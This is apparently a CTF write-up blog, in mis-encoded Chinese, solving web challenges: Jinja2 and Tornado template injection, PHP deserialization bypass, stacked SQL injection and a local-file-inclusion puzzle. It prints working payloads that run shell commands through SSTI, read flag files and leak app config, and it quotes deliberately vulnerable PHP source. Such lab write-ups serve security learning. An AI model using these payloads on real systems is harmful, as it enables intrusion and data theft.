<p>æœ€åéƒ½æ˜¯èšå‰‘è¿æ¥ï¼ŒæŸ¥çœ‹flag<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190453332.png" alt="image-20210816190453332"></p>
<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>æ¨¡æ¿æ³¨å…¥é¢˜ï¼Œå­¦ä¸ä¼šå•Šã€‚</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰ - bmjoker - åšå®¢å›­ (cnblogs.com)</a>ï¼Œè¿™é“é¢˜æ˜¯æ¨¡æ¿junjia2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__ ï¼š è¿”å›å¯¹è±¡æ‰€å±çš„ç±»</span><br><span class="line">__mro__ ï¼š è¿”å›ä¸€ä¸ªç±»æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„,ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</span><br><span class="line">__base__ ï¼š è¿”å›è¯¥ç±»æ‰€ç»§æ‰¿çš„åŸºç±»ï¼Œåªèƒ½æ˜¯ä¸Šä¸€ä¸ªåŸºç±»</span><br><span class="line">__subclasses__ ï¼š æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ª ç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨</span><br><span class="line">__init__ ï¼š ç±»çš„åˆå§‹åŒ–æ–¹æ³•</span><br><span class="line">__globals__ ï¼š å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</span><br></pre></td></tr></table></figure>

<p> <code>os.system</code> å’Œ <code>os.popen</code>, è¿™ä¸¤å¥å‰è€…è¿”å›<strong>é€€å‡ºçŠ¶æ€ç </strong> , åè€…<strong>ä»¥fileå½¢å¼</strong>è¿”å›<strong>è¾“å‡ºå†…å®¹</strong>, æˆ‘ä»¬æƒ³è¦çš„æ˜¯å†…å®¹ï¼Œæ‰€æ‰€ä»¥é€‰æ‹© <code>os.popen</code> </p>
<p>åˆ—å‡ºæ­¥éª¤ï¼š</p>
<ol>
<li><code>&#123;&#123;config&#125;&#125;</code>ï¼Œæ£€æµ‹æ˜¯å¦æœ‰æ¨¡æ¿æ³¨å…¥ï¼Œè¿”å›configä¿¡æ¯</li>
<li><code>&#123;&#123;''.__class__&#125;&#125;</code>ï¼Œè¿”å›æ‰€å±ç±»</li>
<li><code>&#123;&#123;''.__class__.__mro__&#125;&#125;</code>ï¼Œè¿”å›æ‰€å±ç±»çš„åŸºç±»</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125;</code>ï¼Œè¿”å›åŸºç±»objectç±»çš„å­ç±»</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code><br>æ‰¾åˆ°æ’åœ¨ç¬¬72ä¸ªçš„site_Printerç±»ï¼Œåˆå§‹åŒ–ç„¶å<code>os.popen</code>æ‰§è¡Œå‘½ä»¤ï¼Œè¯»å–ã€‚</li>
<li><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</code><br><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()&#125;&#125;</code><br>ä½¿ç”¨æ–‡ä»¶å.read()çš„æ–¹å¼è¯»å–æ–‡ä»¶</li>
</ol>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210817112826768.png" alt="image-20210817112826768"></p>
<p>æ€»ç»“ï¼šæœ¬é¢˜æ˜¯å¯¹urlå…ˆä¼ å…¥å†æ¸²æŸ“ï¼Œæ‰€ä»¥åœ¨æ¸²æŸ“çš„æ—¶å€™å¯¹<code>&#123;&#123;&#125;&#125;`å†…å®¹å½“ä½œå˜é‡è§£æï¼Œæ‰€ä»¥å‡ºç°äº†æ¼æ´ã€‚



### Web_php_unserialize

phpååºåˆ—åŒ–æ¼æ´ã€‚

æ ¹æ®æç¤ºæˆ‘ä»¬è¦å¾—åˆ°`fl4g.php`ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡çš„åªæœ‰ä¸¤ä¸ªç‚¹ï¼š

1. ç»•è¿‡`_wakeup()`ï¼Œé€šè¿‡è®©åºåˆ—åŒ–åçš„å±æ€§æ•°è¶…è¿‡æœ¬è¯¥çš„å±æ€§æ•°ï¼Œå¯¼è‡´å¼‚å¸¸ï¼Œä¸æ‰§è¡Œwakeupå‡½æ•°ã€‚
2. ç»•è¿‡`preg_match('/[oc]:\d+:/i', $var)`ï¼Œæ­£åˆ™åŒ¹é…ï¼Œ`[oc]`å…ƒå­—ç¬¦åŒ¹é…ä¸€ä¸ªå­—ç¬¦oæˆ–è€…cï¼Œ`:`æ™®é€šå­—ç¬¦:ï¼Œ`\d`å…ƒå­—ç¬¦åŒ¹é…ä¸€ä¸ªæ•°å­—ï¼Œ`+`å…ƒå­—ç¬¦è¡¨ç¤ºå¯ä»¥åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå‰ä¸€ä¸ªå­—ç¬¦`\d`ï¼Œ`:`æ™®é€šå­—ç¬¦ã€‚

![image-20210817150314888](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817150314888.png)

å¾—åˆ°flag

![image-20210817153913773](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817153913773.png)

### supersqli

å¼ºç½‘æ¯çš„é¢˜ï¼Œsqlæ³¨å…¥ã€‚

é¦–å…ˆï¼Œ`1' or 1=1 #`æœ‰è¿”å›ç»“æœï¼Œæ˜¯ä¸ªæ³¨å…¥ç‚¹ã€‚

![image-20210817162444026](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817162444026.png)

ç„¶åunion selectè”åˆæŸ¥è¯¢ï¼Œå‘ç°å¤±è´¥äº†ã€‚

![image-20210817162523541](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817162523541.png)

è¿™é“é¢˜è€ƒæŸ¥çš„æ˜¯å †å æ³¨å…¥ï¼ŒæŸ¥è¯¢è¿˜å¯ä»¥ä½¿ç”¨show

1. æŸ¥è¯¢æ‰€æœ‰çš„æ•°æ®åº“ï¼š`1';show database;#`
2. æŸ¥æ‰€æœ‰çš„è¡¨ï¼š`1';show tables;`
3. æŸ¥è¡¨ä¸­çš„æ‰€æœ‰å­—æ®µï¼š``1';show columns from `1919810931114514`;``
4. æŸ¥çœ‹flagå­—æ®µï¼š``1';Set @sql = CONCAT('se','lect flag from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#``ï¼Œè¿‡æ»¤setä½†æ˜¯å¯ä»¥å¤§å°å†™ç»•è¿‡strstrå‡½æ•°

![image-20210817190245570](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210817190245570.png)

è¿™é“é¢˜çš„æ–¹æ³•å±å®æœ‰ç‚¹å¤šï¼Œä¸€ä¸‹å­è§è¯†åˆ°äº†sqlæ³¨å…¥çš„å„ç§æ‰‹æ®µå’ŒçŸ¥è¯†ç‚¹ï¼š

1. handlerä»£æ›¿selectï¼Œhandleræ‹¥æœ‰selectçš„éƒ¨åˆ†åŠŸèƒ½
2. é¢„ç¼–è¯‘ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä½¿ç”¨çš„ï¼Œsetã€prepareã€executeã€‚
3. æ›´æ”¹è¡¨ååˆ—åï¼Œå°†ç°åœ¨æ‰€æŸ¥è¯¢çš„è¡¨ä¸æƒ³è¦æŸ¥è¯¢çš„è¡¨ï¼Œç”¨renameå’Œalterè¯­å¥å°†è¡¨åå’Œå­—æ®µåäº’æ¢ï¼Œç„¶åç›´æ¥æŸ¥è¯¢`1' or 1=1`å³å¯å¾—åˆ°flagã€‚
4. showçš„ç”¨æ³•



### easytornado

æ¨¡æ¿æ³¨å…¥é¢˜ï¼Œä½¿ç”¨çš„æ˜¯pythonçš„tornadoæ¨¡æ¿

æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªè·³è½¬åˆ°çš„erroræ–‡ä»¶

![image-20210818092711193](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818092711193.png)

![image-20210818092929405](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818092929405.png)

![image-20210818093021681](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818093021681.png)

![image-20210818093032490](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818093032490.png)

![image-20210818102517809](æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº/image-20210818102517809.png)

ç»™äº†å››ä¸ªä¿¡æ¯ï¼š

1. flagåœ¨/fllllllllllllagæ–‡ä»¶
2. rederæ¸²æŸ“ï¼Œrenderæ˜¯ä¸€ä¸ªç±»ä¼¼æ¨¡æ¿çš„ä¸œè¥¿ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„å‚æ•°æ¥è®¿é—®ç½‘é¡µ
3. hintæç¤ºï¼Œmd5åŠ å¯†è¿˜æœ‰cookie_secretåŠ ç›ï¼Œä¸urlå¯¹æ¯”ï¼Œå‘ç°è¿™ä¸ªmd5å€¼å°±æ˜¯filehashçš„å€¼ã€‚
4. errorçš„msgå°±æ˜¯æˆ‘ä»¬æ¨¡æ¿æ³¨å…¥çš„åœ°æ–¹

ä¿®æ”¹msgå‚æ•°è¿›è¡Œæ³¨å…¥ã€‚åœ¨tornadoæ¨¡æ¿å¼•æ“ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œ`&#123;&#123;handler.settings&#125;&#125;</code>å¯¹è±¡è·å¾—ç¯å¢ƒå˜é‡</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115153046.png" alt="image-20210818115153046"></p>
<p>ç„¶å<code>md5(cookie_secret+md5(filename))</code>ï¼Œfilename=/fllllllllllllagï¼Œå¾—åˆ°filehash<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115546418.png" alt="image-20210818115546418"></p>
<p>å¾—åˆ°flagï¼š</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210818115605489.png" alt="image-20210818115605489"></p>
<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><p>è¿›å…¥é¡µé¢æœ‰pythonä»£ç ï¼Œå…ˆè¿›è¡Œä»£ç å®¡è®¡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>flaskæ¡†æ¶ï¼Œæ˜¯ä¸€ä¸ªæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</p>
<p><code>/shrine/&lt;path:shrine&gt;</code>å¯ä»¥è¢«<code>flask.render_template_string</code>æ¸²æŸ“ï¼ŒåŒæ—¶æˆ‘ä»¬çœ‹åˆ°å¯¹å°æ‹¬å·è¿›è¡Œäº†æ›¿æ¢ï¼Œå°† ( å’Œ ) æ›¿æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œconfigå’Œselfæ˜¯é»‘åå•ã€‚</p>
<p>æ‰€ä»¥<code>__subclasses__()</code>ã€<code>&#123;&#123;config&#125;&#125;</code>ã€<code>&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</code>ä¸èƒ½ç”¨ï¼Œä½†æ˜¯è¿˜æœ‰åˆ«çš„å‡½æ•°å¯ä»¥ç”¨ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>





<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><p>è¿›å…¥ç¯å¢ƒï¼Œæ ¹æ®æç¤ºè¿›å…¥äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒï¼Œä¹Ÿå¯ä»¥ç”¨burpæ‰«æç›®å½•å‘ç°ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829144657357.png" alt="image-20210829144657357"></p>
<p>å‘ç°getå‹å‚æ•°page=indexï¼Œå¹¶ä¸”å›æ˜¾åœ¨é¡µé¢ï¼Œåº”è¯¥æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)ã€‚</p>
<p>ä½¿ç”¨hackbarè‡ªå¸¦çš„æµ‹è¯•è¯­å¥</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829153518678.png" alt="image-20210829153518678"></p>
<p>æˆåŠŸæ˜¾ç¤ºè¯´æ˜å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç„¶åå°è¯•hackbarçš„phpä¼ªåè®®</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829165018121.png" alt="image-20210829165018121"></p>
<p>base64è§£ç å¾—åˆ°index.phpæºç ï¼Œè¿›è¡Œå®¡è®¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;renderer&quot; content=&quot;webkit&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class=&quot;layui-nav&quot;&gt;</span><br><span class="line">        &lt;li class=&quot;layui-nav-item layui-this&quot;&gt;&lt;a href=&quot;?page=index&quot;&gt;äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;fieldset class=&quot;layui-elem-field layui-field-title&quot; style=&quot;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;legend&gt;è®¾å¤‡åˆ—è¡¨&lt;/legend&gt;</span><br><span class="line">    &lt;/fieldset&gt;</span><br><span class="line">    &lt;table class=&quot;layui-hide&quot; id=&quot;test&quot;&gt;&lt;/table&gt;</span><br><span class="line">    &lt;script type=&quot;text/html&quot; id=&quot;switchTpl&quot;&gt;</span><br><span class="line">        &lt;!-- è¿™é‡Œçš„ checked çš„çŠ¶æ€åªæ˜¯æ¼”ç¤º --&gt;</span><br><span class="line">        &lt;input type=&quot;checkbox&quot; name=&quot;sex&quot; value=&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin=&quot;switch&quot; lay-text=&quot;å¼€|å…³&quot; lay-filter=&quot;checkDemo&quot; &#123;&#123; d.id==1 0003 ? &#x27;checked&#x27; : &#x27;&#x27; &#125;&#125;&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;layui/layui.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#x27;table&#x27;, function() &#123;</span><br><span class="line">        var table = layui.table,</span><br><span class="line">            form = layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: &#x27;#test&#x27;,</span><br><span class="line">            url: &#x27;/somrthing.json&#x27;,</span><br><span class="line">            cellMinWidth: 80,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: &#x27;numbers&#x27; &#125;,</span><br><span class="line">                     &#123; type: &#x27;checkbox&#x27; &#125;,</span><br><span class="line">                     &#123; field: &#x27;id&#x27;, title: &#x27;ID&#x27;, width: 100, unresize: true, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#x27;name&#x27;, title: &#x27;è®¾å¤‡å&#x27;, templet: &#x27;#nameTpl&#x27; &#125;,</span><br><span class="line">                     &#123; field: &#x27;area&#x27;, title: &#x27;åŒºåŸŸ&#x27; &#125;,</span><br><span class="line">                     &#123; field: &#x27;status&#x27;, title: &#x27;ç»´æŠ¤çŠ¶æ€&#x27;, minWidth: 120, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#x27;check&#x27;, title: &#x27;è®¾å¤‡å¼€å…³&#x27;, width: 85, templet: &#x27;#switchTpl&#x27;, unresize: true &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#x27;element&#x27;, function() &#123;</span><br><span class="line">        var element = layui.element; //å¯¼èˆªçš„hoveræ•ˆæœã€äºŒçº§èœå•ç­‰åŠŸèƒ½ï¼Œéœ€è¦ä¾èµ–elementæ¨¡å—</span><br><span class="line">        //ç›‘å¬å¯¼èˆªç‚¹å‡»</span><br><span class="line">        element.on(&#x27;nav(demo)&#x27;, function(elem) &#123;</span><br><span class="line">            //console.log(elem)</span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;input&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;ta:text&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#x27;text&#x27;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page === &#x27;index.php&#x27;) &#123;</span><br><span class="line">                    die(&#x27;Ok&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>å…³é”®éƒ¨åˆ†å°±æ˜¯æœ€åçš„å†…éƒ¨åŠŸèƒ½ï¼Œpayloadï¼š</p>
<ol>
<li><p>XFF å¤´æ˜¯<code>127.0.0.1</code>ï¼Œå¾ˆå¤šæ’ä»¶éƒ½å¯ä»¥å®ç°<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831154447334.png" alt="image-20210831154447334"></p>
</li>
